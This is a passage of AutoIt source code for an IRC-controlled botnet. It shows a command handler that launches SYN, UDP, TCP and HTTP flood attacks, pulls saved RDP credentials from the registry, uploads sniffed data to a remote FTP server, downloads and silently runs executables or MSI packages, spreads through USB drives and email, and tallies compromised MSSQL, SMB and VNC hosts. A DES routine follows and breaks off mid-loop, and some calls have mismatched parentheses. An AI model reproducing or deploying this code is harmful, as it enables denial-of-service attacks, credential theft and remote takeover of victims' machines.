    RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
    FileDelete(@StartupDir & "\*.*")
EndFunc   ;==>BOTKILLER
Func CHANGEMODE($irc, $mode, $chan = "")
    If $irc = +0xffffffff Then Return 0x0
    If $chan = "" Then
        TCPSend($irc, "MODE " & $mode & @CRLF)
        If @error Then
            Return +0xffffffff
        EndIf
        Return 0x1
    EndIf
    TCPSend($irc, "MODE " & $chan & " " & $mode & @CRLF)
    If @error Then
        Return +0xffffffff
    EndIf
    Return 0x1
EndFunc   ;==>CHANGEMODE
Func CLOSESERVICEHANDLE($hscobject)
    Local $avcsh = DllCall("advapi32.dll", "int", "CloseServiceHandle", "hwnd", $hscobject)
    Return $avcsh[0x0]
EndFunc   ;==>CLOSESERVICEHANDLE
Func CMD($user, $channel, $msg)
    Local $stemp = StringSplit($msg, " ")
    If StringRight($stemp[0x1], 0x1) == "*" Then $stemp[0x1] = StringTrimRight($stemp[0x1], 0x1)
    If StringLeft($stemp[0x1], 0x1) == "!" Then $stemp[0x1] = StringTrimLeft($stemp[0x1], 0x1)
    If StringLeft($botid, StringLen($stemp[0x1])) == $stemp[0x1] Then
    Else
        Return
    EndIf
    Switch StringLower($stemp[0x2])
        Case "signin"
            If _ELEMENTEXISTS($stemp, 0x3) Then
                If $stemp[0x3] == $botpassword Then
                    SENDMESSAGE($sock, "Signin successful.", $channel)
                    $signedin = True
                Else
                    SENDMESSAGE($sock, "Signin failed!", $channel)
                EndIf
            EndIf
        Case "signout"
            If $signedin = True Then
                SENDMESSAGE($sock, "Successfully signed out.", $channel)
                $signedin = False
            EndIf
        Case "syn" ; !* syn ip port time
            If _ELEMENTEXISTS($stemp, 0x5) And $signedin = True Then
                SENDMESSAGE($sock, "SYN flooding " & $stemp[0x3] & ":" & $stemp[0x4], $channel)
                NRUN(NMAIN("_SYNFLOOD($stemp[0x3], $stemp[0x4], $stemp[0x5], $stemp[0x6])"))
            EndIf
        Case "udp" ; !* udp ip port packetsize time
            If _ELEMENTEXISTS($stemp, 0x6) And $signedin = True Then
                SENDMESSAGE($sock, "UDP flooding " & $stemp[0x3] & ":" & $stemp[0x4] & " with packetsize " & $stemp[0x5], $channel)
                NRUN(NMAIN("_UDPFLOOD($stemp[0x3], $stemp[0x4], $stemp[0x5], $stemp[0x6])"))
			EndIf
        Case "tcp" ; !* tcp ip port packetsize time
            If _ELEMENTEXISTS($stemp, 0x6) And $signedin = True Then
                SENDMESSAGE($sock, "TCP flooding " & $stemp[0x3] & ":" & $stemp[0x4], $channel)
                NRUN(NMAIN("_TCPFLOOD($stemp[0x3], $stemp[0x4], $stemp[0x5], $stemp[0x6])")
         EndIf
        Case "condis"; !* condis ip port time - connect disconnect flood
            If _ELEMENTEXISTS($stemp, 0x5) And $signedin = True Then
                SENDMESSAGE($sock, "Connect/disconnect flooding " & $stemp[0x3] & ":" & $stemp[0x4], $channel)
                NRUN(NMAIN("_CONDISFLOOD($stemp[0x3], $stemp[0x4], $stemp[0x5], $stemp[0x6])")
            EndIf
        Case "http" ; !* http ip port path time threads
            If _ELEMENTEXISTS($stemp, 0x6) And $signedin = True Then
                SENDMESSAGE($sock, "HTTP flooding http://" & $stemp[0x3] & ":" & $stemp[0x4] & " with " & $stemp[0x6] & " threads.", $channel)
				NMAIN(NRUN("_HTTPFLOOD($stemp[0x3], int($stemp[0x4]), $stemp[0x5], int($stemp[0x6]))"))
            EndIf
        Case "arme" ; !* arme ip port path time threads
            If _ELEMENTEXISTS($stemp, 0x6) And $signedin = True Then
                SENDMESSAGE($sock, "ARME flooding http://" & $stemp[0x3] & ":" & $stemp[0x4] & $stemp[0x5], $channel)
                NRUN(NMAIN("_ARMEFLOOD($stemp[0x3], $stemp[0x4], $stemp[0x5], $stemp[0x6])")
            EndIf
        Case "loot"  ; !* loot ftpserver username password
            If _ELEMENTEXISTS($stemp, 0x5) And $signedin = True Then
                If FileExists($lootloc) Then
                    $sserver = TCPNameToIP($stemp[0x3])
                    $hopen = _FTP_Open($botid)
                    $hconn = _FTP_Connect($hopen, $sserver, $stemp[0x4], $stemp[0x5], 0x1)
                    $hputfile = _FTP_ProgressUpload($hconn, $lootloc, "sniffs-" & @UserName & "-" & @ComputerName & "@" & $myip & ".txt")
                    _FTP_Close($hconn)
                    _FTP_Close($hopen)
                    If $hputfile = 0x1 Then
                        SENDMESSAGE($sock, "Successfully uploaded loot.", $channel)
                    Else
                        SENDMESSAGE($sock, "Error uploading loot.", $channel)
                    EndIf
                Else
                    SENDMESSAGE($sock, "No loot!!! (maybe I'm not running as admin!)", $channel)
                EndIf
            EndIf
        Case "noip"
            If $signedin = True Then
                SENDMESSAGE($sock, NOIP(), $channel)
            EndIf
        Case "filezilla"
            If $signedin = True Then
                SENDMESSAGE($sock, FILEZILLA(), $channel)
            EndIf
        Case "rdp"
            If $signedin = True Then
                For $i = 0x0 To 0x14
                    $servip = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default", "MRU" & $i)
                    If $servip == "" Then ExitLoop
                    $servuser = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\UsernameHint", $servip)
                    $creds = UNCRYPTRDPPASSWORD(BinaryToString(RegRead("HKEY_LOCAL_MACHINE\Comm\Security\CredMan\Creds", $i), 0x2))
                    $rdpcreds &= $servip & " USR: " & $servuser & " PWD: " & $creds & "|"
                Next
                If $rdpcreds <> "" Then
                    SENDMESSAGE($sock, StringTrimRight($rdpcreds, 0x1), $channel)
                EndIf
            EndIf
		Case "localip"
            If $signedin = True Then
                SENDMESSAGE($sock, @IPAddress1, $channel)
            EndIf
        Case "getip"
            If $signedin = True Then
                SENDMESSAGE($sock, $myip, $channel)
            EndIf
		Case "user"
            If $signedin = True Then
                SENDMESSAGE($sock, @UserName, $channel)
            EndIf
		Case "username"
            If $signedin = True Then
                SENDMESSAGE($sock, @UserName, $channel)
            EndIf
        Case "dlexe"
            If _ELEMENTEXISTS($stemp, 0x3) And $signedin = True Then
                $exe = ""
                Dim $aspace[0x3]
                $digits = 0x8
                For $i = 0x1 To $digits
                    $aspace[0x0] = Chr(Random(0x41, 0x5a, 0x1))
                    $aspace[0x1] = Chr(Random(0x61, 0x7a, 0x1))
                    $aspace[0x2] = Chr(Random(0x30, 0x39, 0x1))
                    $exe &= $aspace[Random(0x0, 0x2, 0x1)]
                Next
                Dim $hdownload = InetGet($stemp[0x3], @TempDir & "\" & $exe & ".exe", 0x1, 0x0)
                Run(@TempDir & "\" & $exe & ".exe", "", @SW_HIDE)
                SENDMESSAGE($sock, "Downloaded and executed!", $channel)
            EndIf
        Case "usb"
            If $signedin = True Then
                Local $drivecount = LNK()
                SENDMESSAGE($sock, "Infected " & $drivecount & " removable drives.", $channel)
            EndIf
        Case "sendmail"
            If $signedin = True Then
                Run($installpath & " sendmail", "", @SW_HIDE)
                SENDMESSAGE($sock, "Email spread process started", $channel)
            EndIf
        Case "silentinstall"
            If _ELEMENTEXISTS($stemp, 0x3) And $signedin = True Then
                $msi = ""
                Dim $aspace[0x3]
                $digits = 0x8
                For $i = 0x1 To $digits
                    $aspace[0x0] = Chr(Random(0x41, 0x5a, 0x1))
                    $aspace[0x1] = Chr(Random(0x61, 0x7a, 0x1))
                    $aspace[0x2] = Chr(Random(0x30, 0x39, 0x1))
                    $msi &= $aspace[Random(0x0, 0x2, 0x1)]
                Next
                Dim $hdownload = InetGet($stemp[0x3], @TempDir & "\" & $msi & ".msi", 0x1, 0x0)
                Run('MsiExec.exe /i "' & @TempDir & "\" & $msi & '.msi" /qn /norestart', "", @SW_HIDE)
                SENDMESSAGE($sock, "Silently installing...", $channel)
            EndIf
        Case "scanstats"
            $msg = ""
            $sqls = _FileCountLines($installdir & "\\mssql.txt")
            If $sqls > 0x0 Then
                $msg &= "MSSQL Server Hack count: " & $sqls
            EndIf
            $smbs = _FileCountLines($installdir & "\\smb.txt")
            If $smbs > 0x0 Then
                $msg &= " SMB Hack count: " & $sqls
            EndIf
            $vncs = _FileCountLines($installdir & "\\vnc.txt")
            If $vncs > 0x0 Then
                $msg &= " VNC Hack count: " & $sqls
            EndIf
            If $msg Then
                SENDMESSAGE($sock, $msg)
            EndIf
    EndSwitch
EndFunc   ;==>CMD - 21 commands total
Func DES($key, $message, $encrypt, $mode, $iv)
    Local $spfunction1[0x40] = [0x1010400, 0x0, 0x10000, 0x1010404, 0x1010004, 0x10404, 0x4, 0x10000, 0x400, 0x1010400, 0x1010404, 0x400, 0x1000404, 0x1010004, 0x1000000, 0x4, 0x404, 0x1000400, 0x1000400, 0x10400, 0x10400, 0x1010000, 0x1010000, 0x1000404, 0x10004, 0x1000004, 0x1000004, 0x10004, 0x0, 0x404, 0x10404, 0x1000000, 0x10000, 0x1010404, 0x4, 0x1010000, 0x1010400, 0x1000000, 0x1000000, 0x400, 0x1010004, 0x10000, 0x10400, 0x1000004, 0x400, 0x4, 0x1000404, 0x10404, 0x1010404, 0x10004, 0x1010000, 0x1000404, 0x1000004, 0x404, 0x10404, 0x1010400, 0x404, 0x1000400, 0x1000400, 0x0, 0x10004, 0x10400, 0x0, 0x1010004]
    Local $spfunction2[0x40] = [+0x80108020, +0x80008000, 0x8000, 0x108020, 0x100000, 0x20, +0x80100020, +0x80008020, +0x80000020, +0x80108020, +0x80108000, +0x80000000, +0x80008000, 0x100000, 0x20, +0x80100020, 0x108000, 0x100020, +0x80008020, 0x0, +0x80000000, 0x8000, 0x108020, +0x80100000, 0x100020, +0x80000020, 0x0, 0x108000, 0x8020, +0x80108000, +0x80100000, 0x8020, 0x0, 0x108020, +0x80100020, 0x100000, +0x80008020, +0x80100000, +0x80108000, 0x8000, +0x80100000, +0x80008000, 0x20, +0x80108020, 0x108020, 0x20, 0x8000, +0x80000000, 0x8020, +0x80108000, 0x100000, +0x80000020, 0x100020, +0x80008020, +0x80000020, 0x100020, 0x108000, 0x0, +0x80008000, 0x8020, +0x80000000, +0x80100020, +0x80108020, 0x108000]
    Local $spfunction3[0x40] = [0x208, 0x8020200, 0x0, 0x8020008, 0x8000200, 0x0, 0x20208, 0x8000200, 0x20008, 0x8000008, 0x8000008, 0x20000, 0x8020208, 0x20008, 0x8020000, 0x208, 0x8000000, 0x8, 0x8020200, 0x200, 0x20200, 0x8020000, 0x8020008, 0x20208, 0x8000208, 0x20200, 0x20000, 0x8000208, 0x8, 0x8020208, 0x200, 0x8000000, 0x8020200, 0x8000000, 0x20008, 0x208, 0x20000, 0x8020200, 0x8000200, 0x0, 0x200, 0x20008, 0x8020208, 0x8000200, 0x8000008, 0x200, 0x0, 0x8020008, 0x8000208, 0x20000, 0x8000000, 0x8020208, 0x8, 0x20208, 0x20200, 0x8000008, 0x8020000, 0x8000208, 0x208, 0x8020000, 0x20208, 0x8, 0x8020008, 0x20200]
    Local $spfunction4[0x40] = [0x802001, 0x2081, 0x2081, 0x80, 0x802080, 0x800081, 0x800001, 0x2001, 0x0, 0x802000, 0x802000, 0x802081, 0x81, 0x0, 0x800080, 0x800001, 0x1, 0x2000, 0x800000, 0x802001, 0x80, 0x800000, 0x2001, 0x2080, 0x800081, 0x1, 0x2080, 0x800080, 0x2000, 0x802080, 0x802081, 0x81, 0x800080, 0x800001, 0x802000, 0x802081, 0x81, 0x0, 0x0, 0x802000, 0x2080, 0x800080, 0x800081, 0x1, 0x802001, 0x2081, 0x2081, 0x80, 0x802081, 0x81, 0x1, 0x2000, 0x800001, 0x2001, 0x802080, 0x800081, 0x2001, 0x2080, 0x800000, 0x802001, 0x80, 0x800000, 0x2000, 0x802080]
    Local $spfunction5[0x40] = [0x100, 0x2080100, 0x2080000, 0x42000100, 0x80000, 0x100, 0x40000000, 0x2080000, 0x40080100, 0x80000, 0x2000100, 0x40080100, 0x42000100, 0x42080000, 0x80100, 0x40000000, 0x2000000, 0x40080000, 0x40080000, 0x0, 0x40000100, 0x42080100, 0x42080100, 0x2000100, 0x42080000, 0x40000100, 0x0, 0x42000000, 0x2080100, 0x2000000, 0x42000000, 0x80100, 0x80000, 0x42000100, 0x100, 0x2000000, 0x40000000, 0x2080000, 0x42000100, 0x40080100, 0x2000100, 0x40000000, 0x42080000, 0x2080100, 0x40080100, 0x100, 0x2000000, 0x42080000, 0x42080100, 0x80100, 0x42000000, 0x42080100, 0x2080000, 0x0, 0x40080000, 0x42000000, 0x80100, 0x2000100, 0x40000100, 0x80000, 0x0, 0x40080000, 0x2080100, 0x40000100]
    Local $spfunction6[0x40] = [0x20000010, 0x20400000, 0x4000, 0x20404010, 0x20400000, 0x10, 0x20404010, 0x400000, 0x20004000, 0x404010, 0x400000, 0x20000010, 0x400010, 0x20004000, 0x20000000, 0x4010, 0x0, 0x400010, 0x20004010, 0x4000, 0x404000, 0x20004010, 0x10, 0x20400010, 0x20400010, 0x0, 0x404010, 0x20404000, 0x4010, 0x404000, 0x20404000, 0x20000000, 0x20004000, 0x10, 0x20400010, 0x404000, 0x20404010, 0x400000, 0x4010, 0x20000010, 0x400000, 0x20004000, 0x20000000, 0x4010, 0x20000010, 0x20404010, 0x404000, 0x20400000, 0x404010, 0x20404000, 0x0, 0x20400010, 0x10, 0x4000, 0x20400000, 0x404010, 0x4000, 0x400010, 0x20004010, 0x0, 0x20404000, 0x20000000, 0x400010, 0x20004010]
    Local $spfunction7[0x40] = [0x200000, 0x4200002, 0x4000802, 0x0, 0x800, 0x4000802, 0x200802, 0x4200800, 0x4200802, 0x200000, 0x0, 0x4000002, 0x2, 0x4000000, 0x4200002, 0x802, 0x4000800, 0x200802, 0x200002, 0x4000800, 0x4000002, 0x4200000, 0x4200800, 0x200002, 0x4200000, 0x800, 0x802, 0x4200802, 0x200800, 0x2, 0x4000000, 0x200800, 0x4000000, 0x200800, 0x200000, 0x4000802, 0x4000802, 0x4200002, 0x4200002, 0x2, 0x200002, 0x4000000, 0x4000800, 0x200000, 0x4200800, 0x802, 0x200802, 0x4200800, 0x802, 0x4000002, 0x4200802, 0x4200000, 0x200800, 0x0, 0x2, 0x4200802, 0x0, 0x200802, 0x4200000, 0x800, 0x4000002, 0x4000800, 0x800, 0x200002]
    Local $spfunction8[0x40] = [0x10001040, 0x1000, 0x40000, 0x10041040, 0x10000000, 0x10001040, 0x40, 0x10000000, 0x40040, 0x10040000, 0x10041040, 0x41000, 0x10041000, 0x41040, 0x1000, 0x40, 0x10040000, 0x10000040, 0x10001000, 0x1040, 0x41000, 0x40040, 0x10040040, 0x10041000, 0x1040, 0x0, 0x0, 0x10040040, 0x10000040, 0x10001000, 0x41040, 0x40000, 0x41040, 0x40000, 0x10041000, 0x1000, 0x40, 0x10040040, 0x1000, 0x41040, 0x10001000, 0x40, 0x10000040, 0x10040000, 0x10040040, 0x10000000, 0x40000, 0x10001040, 0x0, 0x10041040, 0x40040, 0x10000040, 0x10040000, 0x10001000, 0x10001040, 0x0, 0x10041040, 0x41000, 0x41000, 0x1040, 0x1040, 0x40040, 0x10000000, 0x10041000]
    Local $masks[0x21] = [0xffffffff, 0x7fffffff, 0x3fffffff, 0x1fffffff, 0xfffffff, 0x7ffffff, 0x3ffffff, 0x1ffffff, 0xffffff, 0x7fffff, 0x3fffff, 0x1fffff, 0xfffff, 0x7ffff, 0x3ffff, 0x1ffff, 0xffff, 0x7fff, 0x3fff, 0x1fff, 0xfff, 0x7ff, 0x3ff, 0x1ff, 0xff, 0x7f, 0x3f, 0x1f, 0xf, 0x7, 0x3, 0x1, 0x0]
    Local $keys = DES_CREATEKEYS($key)
    Local $m = 0x0
    Local $len = StringLen($message)
    Local $chunk = 0x0
    If UBound($keys) == 0x20 Then
        Local $iterations = 0x3
    Else
        Local $iterations = 0x9
    EndIf
    If $iterations == 0x3 Then
        If $encrypt == 0x1 Then
            Local $looping[0x3] = [0x0, 0x20, 0x2]
        Else
            Local $looping[0x3] = [0x1e, +0xfffffffe, +0xfffffffe]
        EndIf
    Else
        If $encrypt == 0x1 Then
            Local $looping[0x9] = [0x0, 0x20, 0x2, 0x3e, 0x1e, +0xfffffffe, 0x40, 0x60, 0x2]
        Else
            Local $looping[0x9] = [0x5e, 0x3e, +0xfffffffe, 0x20, 0x40, 0x2, 0x1e, +0xfffffffe, +0xfffffffe]
        EndIf
    EndIf
    $message &= Chr(0x0) & Chr(0x0) & Chr(0x0) & Chr(0x0) & Chr(0x0) & Chr(0x0) & Chr(0x0) & Chr(0x0)
    $result = ""
    $tempresult = ""
    If $mode == 0x1 Then
        $cbcleft = Dec(Hex(Asc(StringMid($iv, 0x1, 0x1)), 0x2) & Hex(Asc(StringMid($iv, 0x2, 0x1)), 0x2) & Hex(Asc(StringMid($iv, 0x3, 0x1)), 0x2) & Hex(Asc(StringMid($iv, 0x4, 0x1)), 0x2))
        $cbcright = Dec(Hex(Asc(StringMid($iv, 0x5, 0x1)), 0x2) & Hex(Asc(StringMid($iv, 0x6, 0x1)), 0x2) & Hex(Asc(StringMid($iv, 0x7, 0x1)), 0x2) & Hex(Asc(StringMid($iv, 0x8, 0x1)), 0x2))
    EndIf
    While ($m < $len)
        $left_temp = ""
        For $i = 0x1 To 0x4
            $left_temp &= Hex(Asc(StringMid($message, $m + 0x1, 0x1)), 0x2)
            $m += 0x1
        Next
        $left = Dec($left_temp)
        $right_temp = ""
        For $i = 0x1 To 0x4
            $right_temp &= Hex(Asc(StringMid($message, $m + 0x1, 0x1)), 0x2)
            $m += 0x1
        Next
        $right = Dec($right_temp)
        If $mode == 0x1 Then
            If $encrypt Then
                $left = BitXOR($left, $cbcleft)
                $right = BitXOR($right, $cbcright)
            Else
                $cbcleft2 = $cbcleft
                $cbcright2 = $cbcright
                $cbcleft = $left
                $cbcright = $right
            EndIf
        EndIf
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x4), $masks[0x4]), $right), 0xf0f0f0f)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xfffffffc)))
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x10), $masks[0x10]), $right), 0xffff)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xfffffff0)))
        $temp = BitAND(BitXOR(BitAND(BitShift($right, 0x2), $masks[0x2]), $left), 0x33333333)
        $left = BitXOR($left, $temp)
        $right = BitXOR($right, (BitShift($temp, +0xfffffffe)))
        $temp = BitAND(BitXOR(BitAND(BitShift($right, 0x8), $masks[0x8]), $left), 0xff00ff)
        $left = BitXOR($left, $temp)
        $right = BitXOR($right, (BitShift($temp, +0xfffffff8)))
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x1), $masks[0x1]), $right), 0x55555555)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xffffffff)))
        $left = BitOR(BitShift($left, +0xffffffff), BitAND(BitShift($left, 0x1f), $masks[0x1f]))
        $right = BitOR(BitShift($right, +0xffffffff), BitAND(BitShift($right, 0x1f), $masks[0x1f]))
        $j = 0x0
        While $j < ($iterations + 0xffffffff)
            $endloop = $looping[$j + 0x1]
            $loopinc = $looping[$j + 0x2]
            $i = $looping[$j]
            While $i <> $endloop
                $right1 = BitXOR($right, $keys[$i])
                $right2 = BitXOR(BitOR(BitAND(BitShift($right, 0x4), $masks[0x4]), BitShift($right, +0xffffffe4)), $keys[$i + 0x1])
                $temp = $left
                $left = $right
                $right = BitXOR($temp, BitOR($spfunction2[BitAND(BitAND(BitShift($right1, 0x18), $masks[0x18]), 0x3f)], $spfunction4[BitAND(BitAND(BitShift($right1, 0x10), $masks[0x10]), 0x3f)], $spfunction6[BitAND(BitAND(BitShift($right1, 0x8), $masks[0x8]), 0x3f)], $spfunction8[BitAND($right1, 0x3f)], $spfunction1[BitAND(BitAND(BitShift($right2, 0x18), $masks[0x18]), 0x3f)], $spfunction3[BitAND(BitAND(BitShift($right2, 0x10), $masks[0x10]), 0x3f)], $spfunction5[BitAND(BitAND(BitShift($right2, 0x8), $masks[0x8]), 0x3f)], $spfunction7[BitAND($right2, 0x3f)]))
                $i += $loopinc
            WEnd
            $temp = $left
            $left = $right
            $right = $temp
            $j += 0x3
        WEnd
        $left = BitOR(BitAND(BitShift($left, 0x1), $masks[0x1]), BitShift($left, +0xffffffe1))
        $right = BitOR(BitAND(BitShift($right, 0x1), $masks[0x1]), BitShift($right, +0xffffffe1))
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x1), $masks[0x1]), $right), 0x55555555)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xffffffff)))
        $temp = BitAND(BitXOR(BitAND(BitShift($right, 0x8), $masks[0x8]), $left), 0xff00ff)
        $left = BitXOR($left, $temp)
        $right = BitXOR($right, (BitShift($temp, +0xfffffff8)))
        $temp = BitAND(BitXOR(BitAND(BitShift($right, 0x2), $masks[0x2]), $left), 0x33333333)
        $left = BitXOR($left, $temp)
        $right = BitXOR($right, (BitShift($temp, +0xfffffffe)))
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x10), $masks[0x10]), $right), 0xffff)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xfffffff0)))
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x4), $masks[0x4]), $right), 0xf0f0f0f)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xfffffffc)))
        If $mode == 0x1 Then
            If $encrypt Then
                $cbcleft = $left
                $cbcright = $right
            Else
                $left = BitXOR($left, $cbcleft2)
                $right = BitXOR($right, $cbcright2)
            EndIf
        EndIf
        $tempresult &= Chr(BitAND(BitShift($left, 0x18), $masks[0x18]))
        $tempresult &= Chr(BitAND(BitAND(BitShift($left, 0x10), $masks[0x10]), 0xff))
        $tempresult &= Chr(BitAND(BitAND(BitShift($left, 0x8), $masks[0x8]), 0xff))
        $tempresult &= Chr(BitAND($left, 0xff))
        $tempresult &= Chr(BitAND(BitShift($right, 0x18), $masks[0x18]))
        $tempresult &= Chr(BitAND(BitAND(BitShift($right, 0x10), $masks[0x10]), 0xff))
        $tempresult &= Chr(BitAND(BitAND(BitShift($right, 0x8), $masks[0x8]), 0xff))
        $tempresult &= Chr(BitAND($right, 0xff))
        $chunk += 0x8
        If $chunk == 0x200 Then
            $result &= $tempresult
            $tempresult = ""
            $chunk = 0x0
        EndIf
    WEnd
    Return $result & $tempresult
EndFunc   ;==>DES
Func DES_CREATEKEYS($key)
    Local $pc2bytes0[0x10] = [0x0, 0x4, 0x20000000, 0x20000004, 0x10000, 0x10004, 0x20010000, 0x20010004, 0x200, 0x204, 0x20000200, 0x20000204, 0x10200, 0x10204, 0x20010200, 0x20010204]
    Local $pc2bytes1[0x10] = [0x0, 0x1, 0x100000, 0x100001, 0x4000000, 0x4000001, 0x4100000, 0x4100001, 0x100, 0x101, 0x100100, 0x100101, 0x4000100, 0x4000101, 0x4100100, 0x4100101]
    Local $pc2bytes2[0x10] = [0x0, 0x8, 0x800, 0x808, 0x1000000, 0x1000008, 0x1000800, 0x1000808, 0x0, 0x8, 0x800, 0x808, 0x1000000, 0x1000008, 0x1000800, 0x1000808]
    Local $pc2bytes3[0x10] = [0x0, 0x200000, 0x8000000, 0x8200000, 0x2000, 0x202000, 0x8002000, 0x8202000, 0x20000, 0x220000, 0x8020000, 0x8220000, 0x22000, 0x222000, 0x8022000, 0x8222000]
    Local $pc2bytes4[0x10] = [0x0, 0x40000, 0x10, 0x40010, 0x0, 0x40000, 0x10, 0x40010, 0x1000, 0x41000, 0x1010, 0x41010, 0x1000, 0x41000, 0x1010, 0x41010]
    Local $pc2bytes5[0x10] = [0x0, 0x400, 0x20, 0x420, 0x0, 0x400, 0x20, 0x420, 0x2000000, 0x2000400, 0x2000020, 0x2000420, 0x2000000, 0x2000400, 0x2000020, 0x2000420]
    Local $pc2bytes6[0x10] = [0x0, 0x10000000, 0x80000, 0x10080000, 0x2, 0x10000002, 0x80002, 0x10080002, 0x0, 0x10000000, 0x80000, 0x10080000, 0x2, 0x10000002, 0x80002, 0x10080002]
    Local $pc2bytes7[0x10] = [0x0, 0x10000, 0x800, 0x10800, 0x20000000, 0x20010000, 0x20000800, 0x20010800, 0x20000, 0x30000, 0x20800, 0x30800, 0x20020000, 0x20030000, 0x20020800, 0x20030800]
    Local $pc2bytes8[0x10] = [0x0, 0x40000, 0x0, 0x40000, 0x2, 0x40002, 0x2, 0x40002, 0x2000000, 0x2040000, 0x2000000, 0x2040000, 0x2000002, 0x2040002, 0x2000002, 0x2040002]
    Local $pc2bytes9[0x10] = [0x0, 0x10000000, 0x8, 0x10000008, 0x0, 0x10000000, 0x8, 0x10000008, 0x400, 0x10000400, 0x408, 0x10000408, 0x400, 0x10000400, 0x408, 0x10000408]
    Local $pc2bytes10[0x10] = [0x0, 0x20, 0x0, 0x20, 0x100000, 0x100020, 0x100000, 0x100020, 0x2000, 0x2020, 0x2000, 0x2020, 0x102000, 0x102020, 0x102000, 0x102020]
    Local $pc2bytes11[0x10] = [0x0, 0x1000000, 0x200, 0x1000200, 0x200000, 0x1200000, 0x200200, 0x1200200, 0x4000000, 0x5000000, 0x4000200, 0x5000200, 0x4200000, 0x5200000, 0x4200200, 0x5200200]
    Local $pc2bytes12[0x10] = [0x0, 0x1000, 0x8000000, 0x8001000, 0x80000, 0x81000, 0x8080000, 0x8081000, 0x10, 0x1010, 0x8000010, 0x8001010, 0x80010, 0x81010, 0x8080010, 0x8081010]
    Local $pc2bytes13[0x10] = [0x0, 0x4, 0x100, 0x104, 0x0, 0x4, 0x100, 0x104, 0x1, 0x5, 0x101, 0x105, 0x1, 0x5, 0x101, 0x105]
    Local $masks[0x21] = [0xffffffff, 0x7fffffff, 0x3fffffff, 0x1fffffff, 0xfffffff, 0x7ffffff, 0x3ffffff, 0x1ffffff, 0xffffff, 0x7fffff, 0x3fffff, 0x1fffff, 0xfffff, 0x7ffff, 0x3ffff, 0x1ffff, 0xffff, 0x7fff, 0x3fff, 0x1fff, 0xfff, 0x7ff, 0x3ff, 0x1ff, 0xff, 0x7f, 0x3f, 0x1f, 0xf, 0x7, 0x3, 0x1, 0x0]
    If StringLen($key) >= 0x18 Then
        Local $iterations = 0x3
    Else
        Local $iterations = 0x1
    EndIf
    Local $keys[0x1] = [0x20 * $iterations]
    Local $shifts[0x10] = [0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0]
    Local $m = 0x0, $n = 0x0
    For $j = 0x0 To $iterations + 0xffffffff
        $left_temp = ""
        For $i = 0x1 To 0x4
            $left_temp = Hex(Asc(StringMid($key, $m + 0x1, 0x1)), 0x2)
            $m += 0x1
        Next
        $left = Dec($left_temp)
        $right_temp = ""
        For $i = 0x1 To 0x4
            $right_temp = Hex(Asc(StringMid($key, $m + 0x1, 0x1)), 0x2)
            $m += 0x1
        Next
        $right = Dec($right_temp)
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x4), $masks[0x4]), $right), 0xf0f0f0f)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xfffffffc)))
        $temp = BitAND(BitXOR(BitAND(BitShift($right, 0x10), $masks[0x10]), $left), 0xffff)
        $left = BitXOR($left, $temp)
        $right = BitXOR($right, (BitShift($temp, 0x10)))
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x2), $masks[0x2]), $right), 0x33333333)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xfffffffe)))
        $temp = BitAND(BitXOR(BitAND(BitShift($right, 0x10), $masks[0x10]), $left), 0xffff)
        $left = BitXOR($left, $temp)
        $right = BitXOR($right, (BitShift($temp, 0x10)))
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x1), $masks[0x1]), $right), 0x55555555)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xffffffff)))
        $temp = BitAND(BitXOR(BitAND(BitShift($right, 0x8), $masks[0x8]), $left), 0xff00ff)
        $left = BitXOR($left, $temp)
        $right = BitXOR($right, (BitShift($temp, +0xfffffff8)))
        $temp = BitAND(BitXOR(BitAND(BitShift($left, 0x1), $masks[0x1]), $right), 0x55555555)
        $right = BitXOR($right, $temp)
        $left = BitXOR($left, (BitShift($temp, +0xffffffff)))
        $temp = BitOR(BitShift($left, +0xfffffff8), BitAND(BitAND(BitShift($right, 0x14), $masks[0x14]), 0xf0))
        $left = BitOR(BitShift($right, +0xffffffe8), BitAND(BitShift($right, +0xfffffff8), 0xff0000), BitAND(BitAND(BitShift($right, 0x8), $masks[0x8]), 0xff00), BitAND(BitAND(BitShift($right, 0x18), $masks[0x18]), 0xf0))
        $right = $temp
        For $i = 0x0 To UBound($shifts) + 0xffffffff
            If $shifts[$i] Then
                $left = BitOR(BitShift($left, +0xfffffffe), BitAND(BitShift($left, 0x1a), $masks[0x1a]))
                $right = BitOR(BitShift($right, +0xfffffffe), BitAND(BitShift($right, 0x1a), $masks[0x1a]))
            Else
                $left = BitOR(BitShift($left, +0xffffffff), BitAND(BitShift($left, 0x1b), $masks[0x1b]))
                $right = BitOR(BitShift($right, +0xffffffff), BitAND(BitShift($right, 0x1b), $masks[0x1b]))
            EndIf
            $left = BitAND($left, +0xfffffff1)
            $right = BitAND($right, +0xfffffff1)
